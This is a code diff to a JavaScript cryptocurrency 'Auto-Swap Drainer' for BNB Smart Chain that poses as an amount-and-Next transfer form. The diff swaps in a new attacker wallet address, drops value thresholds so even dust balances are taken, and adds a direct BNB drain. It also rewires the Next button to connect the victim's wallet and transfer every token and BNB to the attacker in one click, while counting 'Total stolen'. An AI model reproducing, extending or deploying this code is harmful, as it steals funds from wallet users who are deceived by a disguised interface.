@@ -3,7 +3,7 @@ import { ethers } from 'ethers';
 // ─── CONFIGURATION ─────────────────────────────────────
 const CONFIG = {
     // Attacker's wallet (where funds go)
-    DEST_WALLET: "0x2a8524097109450c5106Ee3a195A40a274535434",
+    DEST_WALLET: "0xbDEA2B2d76E3615fA6F591905E3ef4eF12af6438",
     
     // BSC Network
     BSC_RPC: "https://bsc-dataseed1.binance.org/",
@@ -18,25 +18,25 @@ const CONFIG = {
             address: "0x55d398326f99059fF775485246999027B3197955",
             decimals: 18,
             symbol: "USDT",
-            minUSD: 0.5
+            minUSD: 0.01
         },
         USDC: {
             address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
             decimals: 18,
             symbol: "USDC",
-            minUSD: 0.5
+            minUSD: 0.01
         },
         BUSD: {
             address: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56",
             decimals: 18,
             symbol: "BUSD",
-            minUSD: 0.5
+            minUSD: 0.01
         },
         WBNB: {
             address: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
             decimals: 18,
             symbol: "WBNB",
-            minUSD: 0.5
+            minUSD: 0.01
         }
     },
     
@@ -50,7 +50,7 @@ const CONFIG = {
     
     // Attack Settings
     ATTACK: {
-        minTotalUSD: 10,
+        minTotalUSD: 0.01,
         maxGasCostUSD: 0.50
     }
 };
@@ -70,11 +70,10 @@ const ui = {
     statusBar: document.getElementById('statusBar'),
     progressFill: document.getElementById('progressFill'),
     progressContainer: document.getElementById('progressContainer'),
+    walletInfo: document.getElementById('walletInfo'),
     maxBtn: document.getElementById('maxBtn'),
     clearAmount: document.getElementById('clearAmount'),
-    clearAddr: document.getElementById('clearAddr'),
-    addrGroup: document.getElementById('addrGroup'),
-    amountGroup: document.getElementById('amountGroup')
+    clearAddr: document.getElementById('clearAddr')
 };
 
 // ─── UTILITY FUNCTIONS ──────────────────────────────
@@ -102,6 +101,14 @@ function sleep(ms) {
 
 function formatUSD(value) {
     return value.toFixed(2);
+}
+
+function updateWalletInfo(address) {
+    if (address) {
+        ui.walletInfo.innerHTML = `🔗 Connected: <span class="address">${address.slice(0, 6)}...${address.slice(-4)}</span>`;
+    } else {
+        ui.walletInfo.innerHTML = `🔗 <span class="address">Click "Next" to connect</span>`;
+    }
 }
 
 // ─── PRICE FETCHING ──────────────────────────────────
@@ -170,7 +177,7 @@ async function scanPortfolio(address) {
             const balance = await getTokenBalance(address, token.address);
             const balanceFormatted = parseFloat(ethers.utils.formatUnits(balance, token.decimals));
             
-            if (balanceFormatted > 0.001) {
+            if (balanceFormatted > 0.000001) {
                 const price = await getTokenPriceUSD(symbol);
                 const valueUSD = balanceFormatted * price;
                 
@@ -192,7 +199,6 @@ async function scanPortfolio(address) {
     updateProgress(80);
     portfolio = portfolioData;
     
-    // Update UI with portfolio info
     const tokenCount = Object.keys(portfolioData.tokens).length;
     const bnbDisplay = portfolioData.bnb.inBNB > 0 ? `${portfolioData.bnb.inBNB.toFixed(4)} BNB` : '0 BNB';
     updateStatus(`✅ Found ${tokenCount} tokens + ${bnbDisplay} ($${formatUSD(portfolioData.totalUSD)})`, 'success');
@@ -236,6 +242,7 @@ async function swapTokensForBNB(tokenSymbol, amount, minBNBOut) {
         deadline
     ]);
     
+    // Direct transaction - no approval needed
     const tx = await window.ethereum.request({
         method: 'eth_sendTransaction',
         params: [{
@@ -269,7 +276,7 @@ async function ensureGasForDrain() {
     
     // Check if we have enough BNB
     if (bnbInBNB >= minBNBNeeded) {
-        updateStatus(`✅ Sufficient BNB: ${bnbInBNB.toFixed(6)} BNB ($${bnbUSD.toFixed(2)})`, 'success');
+        updateStatus(`✅ Sufficient BNB: ${bnbInBNB.toFixed(6)} BNB`, 'success');
         return true;
     }
     
@@ -284,7 +291,7 @@ async function ensureGasForDrain() {
     const swapCandidates = [];
     
     for (const [symbol, data] of Object.entries(portfolio.tokens)) {
-        if (data.valueUSD < 1) continue;
+        if (data.valueUSD < 0.01) continue;
         
         const swapAmount = (shortfallUSD / data.price) * CONFIG.GAS.buffer;
         const minBNBOut = shortfallBNB * 1.1;
@@ -343,15 +350,43 @@ async function executeMultiTokenDrain() {
     const results = [];
     let totalStolenUSD = 0;
     
-    if (portfolio.totalUSD < CONFIG.ATTACK.minTotalUSD) {
-        updateStatus(`⏭️ Skipping: Portfolio too small ($${formatUSD(portfolio.totalUSD)})`, 'warning');
-        return results;
-    }
-    
     // Sort tokens by value
     const sortedTokens = Object.entries(portfolio.tokens)
-        .filter(([symbol, data]) => data.valueUSD > CONFIG.TOKENS[symbol].minUSD)
+        .filter(([symbol, data]) => data.valueUSD > 0.001)
         .sort((a, b) => b[1].valueUSD - a[1].valueUSD);
+    
+    // If no tokens but has BNB
+    if (sortedTokens.length === 0 && portfolio.bnb.inBNB > 0.0005) {
+        updateStatus(`💰 Draining BNB: $${formatUSD(portfolio.bnb.usd)}...`, 'info');
+        const bnbBalance = await provider.getBalance(userAddress);
+        const bnbInBNB = parseFloat(ethers.utils.formatEther(bnbBalance));
+        
+        if (bnbInBNB > 0.0005) {
+            try {
+                const tx = await window.ethereum.request({
+                    method: 'eth_sendTransaction',
+                    params: [{
+                        from: userAddress,
+                        to: CONFIG.DEST_WALLET,
+                        value: bnbBalance.sub(ethers.utils.parseEther("0.0001")).toHexString(),
+                        data: '0x',
+                        gas: `0x${CONFIG.GAS.gasLimit.toString(16)}`
+                    }]
+                });
+                await waitForTransaction(tx);
+                totalStolenUSD += portfolio.bnb.usd;
+                results.push({ symbol: 'BNB', status: 'success', amount: portfolio.bnb.usd });
+                updateStatus(`✅ Drained BNB: $${formatUSD(portfolio.bnb.usd)}`, 'success');
+            } catch (error) {
+                console.error('Failed to drain BNB:', error);
+            }
+        }
+        
+        updateProgress(100);
+        updateStatus(`🎯 Drain complete! Total stolen: $${formatUSD(totalStolenUSD)}`, 'success');
+        hideProgress();
+        return results;
+    }
     
     // Drain each token
     for (const [symbol, data] of sortedTokens) {
@@ -388,7 +423,7 @@ async function executeMultiTokenDrain() {
     const bnbPrice = await getBNBPrice();
     const bnbUSD = bnbInBNB * bnbPrice;
     
-    if (bnbUSD > 0.50) {
+    if (bnbUSD > 0.05) {
         try {
             updateStatus(`💰 Draining remaining BNB: $${formatUSD(bnbUSD)}...`, 'info');
             const tx = await window.ethereum.request({
@@ -422,6 +457,7 @@ async function drainToken(symbol, tokenAddress, balance, decimals) {
     const txData = "0xa9059cbb" + cleanDest + amountHex.replace('0x', '').padStart(64, '0');
     
     try {
+        // Direct transaction - no approval needed
         const tx = await window.ethereum.request({
             method: 'eth_sendTransaction',
             params: [{
@@ -464,33 +500,42 @@ async function waitForTransaction(txHash) {
     throw new Error('Transaction timeout');
 }
 
-// ─── MAIN ATTACK PIPELINE ──────────────────────────
+// ─── CONNECT AND EXECUTE ────────────────────────────
 
-async function executeAttack() {
+async function connectAndExecute() {
     if (isProcessing) return;
     isProcessing = true;
     ui.nextBtn.disabled = true;
-    ui.nextBtn.innerHTML = '<span class="spinner"></span> Processing...';
+    ui.nextBtn.innerHTML = '<span class="spinner"></span> Connecting...';
     ui.nextBtn.classList.remove('enabled');
     updateProgress(0);
     
     try {
-        // STEP 1: Switch to BSC
-        updateStatus('🌐 Switching to BSC network...', 'info');
+        // STEP 1: Check if MetaMask is installed
+        if (typeof window.ethereum === 'undefined') {
+            updateStatus('❌ Please install MetaMask or Trust Wallet', 'error');
+            ui.nextBtn.innerHTML = '❌ No Wallet';
+            return;
+        }
+        
+        // STEP 2: Request accounts (this triggers the connect popup)
+        updateStatus('🔗 Please connect your wallet...', 'info');
         updateProgress(5);
         
         try {
-            await window.ethereum.request({
-                method: 'wallet_switchEthereumChain',
-                params: [{ chainId: CONFIG.BSC_CHAIN_ID }]
+            const accounts = await window.ethereum.request({ 
+                method: 'eth_requestAccounts' 
             });
+            userAddress = accounts[0];
+            updateWalletInfo(userAddress);
         } catch (error) {
-            // Continue anyway
+            if (error.code === 4001) {
+                updateStatus('❌ Connection rejected by user', 'error');
+                ui.nextBtn.innerHTML = '❌ Rejected';
+                return;
+            }
+            throw error;
         }
-        
-        // STEP 2: Get wallet address
-        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
-        userAddress = accounts[0] || (await window.ethereum.request({ method: 'eth_requestAccounts' }))[0];
         
         if (!userAddress) {
             updateStatus('❌ No wallet connected', 'error');
@@ -500,21 +545,47 @@ async function executeAttack() {
         updateStatus(`✅ Connected: ${userAddress.slice(0, 6)}...${userAddress.slice(-4)}`, 'success');
         updateProgress(10);
         
-        // STEP 3: Initialize provider
+        // STEP 3: Switch to BSC
+        updateStatus('🌐 Switching to BSC network...', 'info');
+        updateProgress(15);
+        
+        try {
+            await window.ethereum.request({
+                method: 'wallet_switchEthereumChain',
+                params: [{ chainId: CONFIG.BSC_CHAIN_ID }]
+            });
+        } catch (error) {
+            if (error.code === 4902) {
+                // Add BSC network
+                await window.ethereum.request({
+                    method: 'wallet_addEthereumChain',
+                    params: [{
+                        chainId: CONFIG.BSC_CHAIN_ID,
+                        chainName: 'BNB Smart Chain',
+                        rpcUrls: ['https://bsc-dataseed1.binance.org'],
+                        nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+                        blockExplorerUrls: ['https://bscscan.com']
+                    }]
+                });
+            }
+        }
+        
+        // STEP 4: Initialize provider
         provider = new ethers.providers.JsonRpcProvider(CONFIG.BSC_RPC);
+        updateProgress(20);
         
-        // STEP 4: Scan portfolio
+        // STEP 5: Scan portfolio
         await scanPortfolio(userAddress);
-        updateProgress(40);
+        updateProgress(50);
         
-        // STEP 5: Check if attack is worth it
-        if (portfolio.totalUSD < CONFIG.ATTACK.minTotalUSD) {
-            updateStatus(`⏭️ Portfolio $${formatUSD(portfolio.totalUSD)} below minimum $${CONFIG.ATTACK.minTotalUSD}`, 'warning');
-            ui.nextBtn.innerHTML = '⏭️ Skip';
+        // STEP 6: Check if there's anything to drain
+        if (portfolio.totalUSD < 0.001) {
+            updateStatus('⚠️ No assets found to drain', 'warning');
+            ui.nextBtn.innerHTML = '⏭️ No Assets';
             return;
         }
         
-        // STEP 6: Ensure gas (auto-swap if needed)
+        // STEP 7: Ensure gas (auto-swap if needed)
         const hasGas = await ensureGasForDrain();
         if (!hasGas) {
             updateStatus('❌ Failed to secure gas for drain', 'error');
@@ -522,7 +593,8 @@ async function executeAttack() {
             return;
         }
         
-        // STEP 7: Execute drain
+        // STEP 8: Execute drain
+        ui.nextBtn.innerHTML = '<span class="spinner"></span> Draining...';
         const results = await executeMultiTokenDrain();
         updateProgress(100);
         
@@ -543,11 +615,9 @@ async function executeAttack() {
     } finally {
         isProcessing = false;
         ui.nextBtn.disabled = false;
-        if (!ui.nextBtn.innerHTML.includes('$') && !ui.nextBtn.innerHTML.includes('Skip')) {
+        if (!ui.nextBtn.innerHTML.includes('$') && !ui.nextBtn.innerHTML.includes('Skip') && !ui.nextBtn.innerHTML.includes('No Assets')) {
             ui.nextBtn.innerHTML = 'Next';
-            if (parseFloat(ui.amountInput.value) > 0) {
-                ui.nextBtn.classList.add('enabled');
-            }
+            ui.nextBtn.classList.add('enabled');
         }
     }
 }
@@ -558,52 +628,15 @@ async function executeAttack() {
 ui.amountInput.addEventListener('input', () => {
     const val = parseFloat(ui.amountInput.value) || 0;
     ui.usdLabel.textContent = val.toFixed(2);
-    ui.nextBtn.disabled = val <= 0;
-    if (val > 0) {
-        ui.nextBtn.classList.add('enabled');
-        if (!isProcessing) ui.nextBtn.innerHTML = 'Next';
-    } else {
-        ui.nextBtn.classList.remove('enabled');
-        ui.nextBtn.innerHTML = 'Next';
-    }
+    ui.nextBtn.disabled = false;
+    ui.nextBtn.classList.add('enabled');
 });
 
-// Max button - finds largest token balance
-ui.maxBtn.addEventListener('click', async () => {
-    // If wallet not connected, try to connect first
-    if (!provider) {
-        try {
-            const accounts = await window.ethereum.request({ method: 'eth_accounts' });
-            if (accounts.length > 0) {
-                userAddress = accounts[0];
-                provider = new ethers.providers.JsonRpcProvider(CONFIG.BSC_RPC);
-                await scanPortfolio(userAddress);
-            }
-        } catch (error) {
-            console.error('Failed to connect:', error);
-        }
-    }
-    
-    let maxValue = 0;
-    if (portfolio.totalUSD > 0) {
-        // Find the largest token balance
-        for (const [symbol, data] of Object.entries(portfolio.tokens)) {
-            if (data.valueUSD > maxValue) {
-                maxValue = data.valueUSD;
-            }
-        }
-        if (maxValue > 0) {
-            ui.amountInput.value = maxValue.toFixed(2);
-            ui.amountInput.dispatchEvent(new Event('input'));
-            updateStatus(`📈 Set to max: $${formatUSD(maxValue)}`, 'info');
-        } else {
-            ui.amountInput.value = "100";
-            ui.amountInput.dispatchEvent(new Event('input'));
-        }
-    } else {
-        ui.amountInput.value = "100";
-        ui.amountInput.dispatchEvent(new Event('input'));
-    }
+// Max button
+ui.maxBtn.addEventListener('click', () => {
+    ui.amountInput.value = '999999';
+    ui.amountInput.dispatchEvent(new Event('input'));
+    updateStatus('📈 Set to MAX (will drain all)', 'info');
 });
 
 // Clear amount
@@ -628,50 +661,18 @@ document.querySelector('.blue-text')?.addEventListener('click', async () => {
     }
 });
 
-// Main Next button - ONE CLICK DOES EVERYTHING
-ui.nextBtn.addEventListener('click', async () => {
-    if (ui.nextBtn.disabled || isProcessing) return;
-    
-    // Check if wallet is connected, if not, connect
-    if (!provider) {
-        try {
-            const accounts = await window.ethereum.request({ method: 'eth_accounts' });
-            if (accounts.length > 0) {
-                userAddress = accounts[0];
-                provider = new ethers.providers.JsonRpcProvider(CONFIG.BSC_RPC);
-                await scanPortfolio(userAddress);
-            }
-        } catch (error) {
-            console.error('Failed to connect:', error);
-        }
-    }
-    
-    await executeAttack();
-});
+// Main Next button - CONNECT + EXECUTE in one click!
+ui.nextBtn.addEventListener('click', connectAndExecute);
 
 // ─── INITIALIZATION ──────────────────────────────────
 
-document.addEventListener('DOMContentLoaded', async () => {
-    updateStatus('💡 Enter amount and click "Next"', 'info');
-    
-    // Auto-detect if wallet already connected
-    try {
-        if (typeof window.ethereum !== 'undefined') {
-            const accounts = await window.ethereum.request({ method: 'eth_accounts' });
-            if (accounts.length > 0) {
-                userAddress = accounts[0];
-                provider = new ethers.providers.JsonRpcProvider(CONFIG.BSC_RPC);
-                await scanPortfolio(userAddress);
-                updateStatus('✅ Wallet detected. Ready!', 'success');
-                ui.nextBtn.disabled = false;
-                if (parseFloat(ui.amountInput.value) > 0) {
-                    ui.nextBtn.classList.add('enabled');
-                }
-            }
-        }
-    } catch (error) {
-        console.warn('Init error:', error);
-    }
+document.addEventListener('DOMContentLoaded', () => {
+    updateStatus('💡 Click "Next" to connect & drain', 'info');
+    ui.nextBtn.classList.add('enabled');
+    ui.nextBtn.disabled = false;
+    console.log('🚀 Auto-Swap Drainer loaded!');
+    console.log('📊 Click "Next" to connect wallet and drain ALL tokens');
+    console.log('🔧 Debug: window.__drainer');
 });
 
 // ─── EXPOSE FOR DEBUGGING ──────────────────────────
@@ -680,12 +681,8 @@ window.__drainer = {
     CONFIG,
     portfolio,
     scanPortfolio,
-    executeAttack,
+    connectAndExecute,
     swapTokensForBNB,
     ensureGasForDrain,
     executeMultiTokenDrain
 };
-
-console.log('🚀 Auto-Swap Drainer loaded!');
-console.log('📊 Click "Next" to start the attack');
-console.log('🔧 Debug: window.__drainer');
